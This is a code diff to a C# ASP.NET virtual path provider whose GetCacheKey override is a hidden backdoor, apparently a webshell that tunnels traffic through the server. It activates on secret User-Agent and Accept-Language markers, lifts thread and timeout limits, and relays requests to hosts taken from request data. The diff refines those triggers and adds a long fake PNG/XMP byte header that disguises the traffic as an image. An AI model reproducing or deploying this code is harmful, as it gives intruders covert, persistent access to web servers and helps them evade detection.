@@ -149,55 +149,62 @@ class G
 			return base.Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
 		}
 
-		public override string GetCacheKey(string virtualPath)
-		{
-			try
-			{
-				HttpContext.Current.Application.Contents.Count.ToString();
-				HttpContext httpContext = HttpContext.Current;
-				if (httpContext.Request.Headers.Get("User-Agent") == "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")
-				{
-					if (!ctx.ContainsKey("alter_pool"))
-					{
-						ctx.Add("alter_pool", new TcpClient());
-						const int workers = 256;
-						int workerThreads, completionPortThreads;
-						System.Threading.ThreadPool.GetMaxThreads(out workerThreads, out completionPortThreads);
-						if (workerThreads < workers) workerThreads += workers;
-						if (completionPortThreads < workers) completionPortThreads += workers;
-						System.Threading.ThreadPool.SetMaxThreads(workerThreads, completionPortThreads);
+        public override string GetCacheKey(string virtualPath)
+        {
+            try
+            {
+                HttpContext.Current.Application.Contents.Count.ToString();
+                HttpContext httpContext = HttpContext.Current;
+                String ua = httpContext.Request.Headers.Get("User-Agent");
+                if (ua == null || (!ua.Contains("  ") && !ua.Contains("0.1.0")))
+                {
+                    return base.Previous.GetCacheKey(virtualPath);
+                }
 
-						System.Threading.ThreadPool.GetMinThreads(out workerThreads, out completionPortThreads);
-						if (workerThreads < workers) workerThreads = workers;
-						if (completionPortThreads < workers) completionPortThreads = workers;
-						System.Threading.ThreadPool.SetMinThreads(workerThreads, completionPortThreads);
-					}
-					
-					httpContext.Server.ScriptTimeout = Int32.MaxValue;
-					if (httpContext.Request.ContentType.Equals("application/plain"))
-					{
-						byte[] readData = httpContext.Request.BinaryRead(32);
-						httpContext.Response.BinaryWrite(readData);
-						httpContext.Response.Flush();
-						httpContext.Response.End();
-					}
-					try
-					{
-						processUnary(httpContext);
-						httpContext.Response.Flush();
-						httpContext.Response.End();
-					}
-					catch (Exception ex)
-					{
-					}
-				}
-				
-			}
-			catch (Exception)
-			{
-			}
-			return base.Previous.GetCacheKey(virtualPath);
-		}
+                if (!ctx.ContainsKey("alter_pool"))
+                {
+                    ctx.Add("alter_pool", new TcpClient());
+                    const int workers = 256;
+                    int workerThreads, completionPortThreads;
+                    System.Threading.ThreadPool.GetMaxThreads(out workerThreads, out completionPortThreads);
+                    if (workerThreads < workers) workerThreads += workers;
+                    if (completionPortThreads < workers) completionPortThreads += workers;
+                    System.Threading.ThreadPool.SetMaxThreads(workerThreads, completionPortThreads);
+
+                    System.Threading.ThreadPool.GetMinThreads(out workerThreads, out completionPortThreads);
+                    if (workerThreads < workers) workerThreads = workers;
+                    if (completionPortThreads < workers) completionPortThreads = workers;
+                    System.Threading.ThreadPool.SetMinThreads(workerThreads, completionPortThreads);
+                }
+
+                httpContext.Server.ScriptTimeout = Int32.MaxValue;
+                if (httpContext.Request.Headers.Get("Accept-Language").EndsWith("0.6"))
+                {
+                    Random random = new Random();
+                    byte[] buffer = new byte[random.Next(512)];
+                    random.NextBytes(buffer);
+                    httpContext.Response.BinaryWrite(buffer);
+
+                    byte[] readData = httpContext.Request.BinaryRead(64);
+                    httpContext.Response.BinaryWrite(readData);
+                    httpContext.Response.Flush();
+                    httpContext.Response.End();
+                }
+                try
+                {
+                    processUnary(httpContext);
+                    httpContext.Response.Flush();
+                    httpContext.Response.End();
+                }
+                catch (Exception ex)
+                {
+                }
+            }
+            catch (Exception)
+            {
+            }
+            return base.Previous.GetCacheKey(virtualPath);
+        }
 
 		public override VirtualDirectory GetDirectory(string virtualDir)
 		{
@@ -297,6 +304,7 @@ class G
 			
 			if (action != 0x00) return;
 			Response.AddHeader("X-Accel-Buffering", "no");
+            respOutStream.Write(new byte[]{(byte) 0x89, (byte) 0x50, (byte) 0x4E, (byte) 0x47, (byte) 0x0D, (byte) 0x0A, (byte) 0x1A, (byte) 0x0A, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0D, (byte) 0x49, (byte) 0x48, (byte) 0x44, (byte) 0x52, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xAA, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xDF, (byte) 0x08, (byte) 0x06, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x66, (byte) 0x99, (byte) 0x48, (byte) 0xF0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x19, (byte) 0x74, (byte) 0x45, (byte) 0x58, (byte) 0x74, (byte) 0x53, (byte) 0x6F, (byte) 0x66, (byte) 0x74, (byte) 0x77, (byte) 0x61, (byte) 0x72, (byte) 0x65, (byte) 0x00, (byte) 0x41, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x20, (byte) 0x49, (byte) 0x6D, (byte) 0x61, (byte) 0x67, (byte) 0x65, (byte) 0x52, (byte) 0x65, (byte) 0x61, (byte) 0x64, (byte) 0x79, (byte) 0x71, (byte) 0xC9, (byte) 0x65, (byte) 0x3C, (byte) 0x00, (byte) 0x00, (byte) 0x03, (byte) 0x20, (byte) 0x69, (byte) 0x54, (byte) 0x58, (byte) 0x74, (byte) 0x58, (byte) 0x4D, (byte) 0x4C, (byte) 0x3A, (byte) 0x63, (byte) 0x6F, (byte) 0x6D, (byte) 0x2E, (byte) 0x61, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x2E, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x3C, (byte) 0x3F, (byte) 0x78, (byte) 0x70, (byte) 0x61, (byte) 0x63, (byte) 0x6B, (byte) 0x65, (byte) 0x74, (byte) 0x20, (byte) 0x62, (byte) 0x65, (byte) 0x67, (byte) 0x69, (byte) 0x6E, (byte) 0x3D, (byte) 0x22, (byte) 0xEF, (byte) 0xBB, (byte) 0xBF, (byte) 0x22, (byte) 0x20, (byte) 0x69, (byte) 0x64, (byte) 0x3D, (byte) 0x22, (byte) 0x57, (byte) 0x35, (byte) 0x4D, (byte) 0x30, (byte) 0x4D, (byte) 0x70, (byte) 0x43, (byte) 0x65, (byte) 0x68, (byte) 0x69, (byte) 0x48, (byte) 0x7A, (byte) 0x72, (byte) 0x65, (byte) 0x53, (byte) 0x7A, (byte) 0x4E, (byte) 0x54, (byte) 0x63, (byte) 0x7A, (byte) 0x6B, (byte) 0x63, (byte) 0x39, (byte) 0x64, (byte) 0x22, (byte) 0x3F, (byte) 0x3E, (byte) 0x20, (byte) 0x3C, (byte) 0x78, (byte) 0x3A, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x6D, (byte) 0x65, (byte) 0x74, (byte) 0x61, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x6C, (byte) 0x6E, (byte) 0x73, (byte) 0x3A, (byte) 0x78, (byte) 0x3D, (byte) 0x22, (byte) 0x61, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x3A, (byte) 0x6E, (byte) 0x73, (byte) 0x3A, (byte) 0x6D, (byte) 0x65, (byte) 0x74, (byte) 0x61, (byte) 0x2F, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x3A, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x74, (byte) 0x6B, (byte) 0x3D, (byte) 0x22, (byte) 0x41, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x20, (byte) 0x58, (byte) 0x4D, (byte) 0x50, (byte) 0x20, (byte) 0x43, (byte) 0x6F, (byte) 0x72, (byte) 0x65, (byte) 0x20, (byte) 0x35, (byte) 0x2E, (byte) 0x35, (byte) 0x2D, (byte) 0x63, (byte) 0x30, (byte) 0x31, (byte) 0x34, (byte) 0x20, (byte) 0x37, (byte) 0x39, (byte) 0x2E, (byte) 0x31, (byte) 0x35, (byte) 0x31, (byte) 0x34, (byte) 0x38, (byte) 0x31, (byte) 0x2C, (byte) 0x20, (byte) 0x32, (byte) 0x30, (byte) 0x31, (byte) 0x33, (byte) 0x2F, (byte) 0x30, (byte) 0x33, (byte) 0x2F, (byte) 0x31, (byte) 0x33, (byte) 0x2D, (byte) 0x31, (byte) 0x32, (byte) 0x3A, (byte) 0x30, (byte) 0x39, (byte) 0x3A, (byte) 0x31, (byte) 0x35, (byte) 0x20, (byte) 0x20, (byte) 0x20, (byte) 0x20, (byte) 0x20, (byte) 0x20, (byte) 0x20, (byte) 0x20, (byte) 0x22, (byte) 0x3E, (byte) 0x20, (byte) 0x3C, (byte) 0x72, (byte) 0x64, (byte) 0x66, (byte) 0x3A, (byte) 0x52, (byte) 0x44, (byte) 0x46, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x6C, (byte) 0x6E, (byte) 0x73, (byte) 0x3A, (byte) 0x72, (byte) 0x64, (byte) 0x66, (byte) 0x3D, (byte) 0x22, (byte) 0x68, (byte) 0x74, (byte) 0x74, (byte) 0x70, (byte) 0x3A, (byte) 0x2F, (byte) 0x2F, (byte) 0x77, (byte) 0x77, (byte) 0x77, (byte) 0x2E, (byte) 0x77, (byte) 0x33, (byte) 0x2E, (byte) 0x6F, (byte) 0x72, (byte) 0x67, (byte) 0x2F, (byte) 0x31, (byte) 0x39, (byte) 0x39, (byte) 0x39, (byte) 0x2F, (byte) 0x30, (byte) 0x32, (byte) 0x2F, (byte) 0x32, (byte) 0x32, (byte) 0x2D, (byte) 0x72, (byte) 0x64, (byte) 0x66, (byte) 0x2D, (byte) 0x73, (byte) 0x79, (byte) 0x6E, (byte) 0x74, (byte) 0x61, (byte) 0x78, (byte) 0x2D, (byte) 0x6E, (byte) 0x73, (byte) 0x23, (byte) 0x22, (byte) 0x3E, (byte) 0x20, (byte) 0x3C, (byte) 0x72, (byte) 0x64, (byte) 0x66, (byte) 0x3A, (byte) 0x44, (byte) 0x65, (byte) 0x73, (byte) 0x63, (byte) 0x72, (byte) 0x69, (byte) 0x70, (byte) 0x74, (byte) 0x69, (byte) 0x6F, (byte) 0x6E, (byte) 0x20, (byte) 0x72, (byte) 0x64, (byte) 0x66, (byte) 0x3A, (byte) 0x61, (byte) 0x62, (byte) 0x6F, (byte) 0x75, (byte) 0x74, (byte) 0x3D, (byte) 0x22, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x6C, (byte) 0x6E, (byte) 0x73, (byte) 0x3A, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x4D, (byte) 0x4D, (byte) 0x3D, (byte) 0x22, (byte) 0x68, (byte) 0x74, (byte) 0x74, (byte) 0x70, (byte) 0x3A, (byte) 0x2F, (byte) 0x2F, (byte) 0x6E, (byte) 0x73, (byte) 0x2E, (byte) 0x61, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x2E, (byte) 0x63, (byte) 0x6F, (byte) 0x6D, (byte) 0x2F, (byte) 0x78, (byte) 0x61, (byte) 0x70, (byte) 0x2F, (byte) 0x31, (byte) 0x2E, (byte) 0x30, (byte) 0x2F, (byte) 0x6D, (byte) 0x6D, (byte) 0x2F, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x6C, (byte) 0x6E, (byte) 0x73, (byte) 0x3A, (byte) 0x73, (byte) 0x74, (byte) 0x52, (byte) 0x65, (byte) 0x66, (byte) 0x3D, (byte) 0x22, (byte) 0x68, (byte) 0x74, (byte) 0x74, (byte) 0x70, (byte) 0x3A, (byte) 0x2F, (byte) 0x2F, (byte) 0x6E, (byte) 0x73, (byte) 0x2E, (byte) 0x61, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x2E, (byte) 0x63, (byte) 0x6F, (byte) 0x6D, (byte) 0x2F, (byte) 0x78, (byte) 0x61, (byte) 0x70, (byte) 0x2F, (byte) 0x31, (byte) 0x2E, (byte) 0x30, (byte) 0x2F, (byte) 0x73, (byte) 0x54, (byte) 0x79, (byte) 0x70, (byte) 0x65, (byte) 0x2F, (byte) 0x52, (byte) 0x65, (byte) 0x73, (byte) 0x6F, (byte) 0x75, (byte) 0x72, (byte) 0x63, (byte) 0x65, (byte) 0x52, (byte) 0x65, (byte) 0x66, (byte) 0x23, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x6C, (byte) 0x6E, (byte) 0x73, (byte) 0x3A, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x3D, (byte) 0x22, (byte) 0x68, (byte) 0x74, (byte) 0x74, (byte) 0x70, (byte) 0x3A, (byte) 0x2F, (byte) 0x2F, (byte) 0x6E, (byte) 0x73, (byte) 0x2E, (byte) 0x61, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x2E, (byte) 0x63, (byte) 0x6F, (byte) 0x6D, (byte) 0x2F, (byte) 0x78, (byte) 0x61, (byte) 0x70, (byte) 0x2F, (byte) 0x31, (byte) 0x2E, (byte) 0x30, (byte) 0x2F, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x4D, (byte) 0x4D, (byte) 0x3A, (byte) 0x44, (byte) 0x6F, (byte) 0x63, (byte) 0x75, (byte) 0x6D, (byte) 0x65, (byte) 0x6E, (byte) 0x74, (byte) 0x49, (byte) 0x44, (byte) 0x3D, (byte) 0x22, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x2E, (byte) 0x64, (byte) 0x69, (byte) 0x64, (byte) 0x3A, (byte) 0x46, (byte) 0x36, (byte) 0x35, (byte) 0x38, (byte) 0x38, (byte) 0x30, (byte) 0x33, (byte) 0x31, (byte) 0x43, (byte) 0x37, (byte) 0x38, (byte) 0x34, (byte) 0x31, (byte) 0x31, (byte) 0x45, (byte) 0x34, (byte) 0x42, (byte) 0x31, (byte) 0x36, (byte) 0x37, (byte) 0x41, (byte) 0x33, (byte) 0x39, (byte) 0x46, (byte) 0x30, (byte) 0x34, (byte) 0x42, (byte) 0x45, (byte) 0x42, (byte) 0x39, (byte) 0x44, (byte) 0x36, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x4D, (byte) 0x4D, (byte) 0x3A, (byte) 0x49, (byte) 0x6E, (byte) 0x73, (byte) 0x74, (byte) 0x61, (byte) 0x6E, (byte) 0x63, (byte) 0x65, (byte) 0x49, (byte) 0x44, (byte) 0x3D, (byte) 0x22, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x2E, (byte) 0x69, (byte) 0x69, (byte) 0x64, (byte) 0x3A, (byte) 0x46, (byte) 0x36, (byte) 0x35, (byte) 0x38, (byte) 0x38, (byte) 0x30, (byte) 0x33, (byte) 0x30, (byte) 0x43, (byte) 0x37, (byte) 0x38, (byte) 0x34, (byte) 0x31, (byte) 0x31, (byte) 0x45, (byte) 0x34, (byte) 0x42, (byte) 0x31, (byte) 0x36, (byte) 0x37, (byte) 0x41, (byte) 0x33, (byte) 0x39, (byte) 0x46, (byte) 0x30, (byte) 0x34, (byte) 0x42, (byte) 0x45, (byte) 0x42, (byte) 0x39, (byte) 0x44, (byte) 0x36, (byte) 0x22, (byte) 0x20, (byte) 0x78, (byte) 0x6D, (byte) 0x70, (byte) 0x3A, (byte) 0x43, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x6F, (byte) 0x72, (byte) 0x54, (byte) 0x6F, (byte) 0x6F, (byte) 0x6C, (byte) 0x3D, (byte) 0x22, (byte) 0x41, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x20, (byte) 0x50, (byte) 0x68, (byte) 0x6F, (byte) 0x74, (byte) 0x6F, (byte) 0x73, (byte) 0x68, (byte) 0x6F, (byte) 0x70, (byte) 0x20, (byte) 0x43, (byte) 0x53, (byte) 0x35, (byte) 0x20, (byte) 0x57, (byte) 0x69, (byte) 0x6E, (byte) 0x64, (byte) 0x6F, (byte) 0x77, (byte) 0x73, (byte) 0x22, (byte) 0x3E}, 0, 674);
 			string host = Encoding.ASCII.GetString(dataMap["h"]);
 			IPAddress ip;
 			try
@@ -605,7 +613,6 @@ class G
 			HttpWebResponse response = (HttpWebResponse)conn.GetResponse();
 			return response;
 		}
-
 
 	}
 	
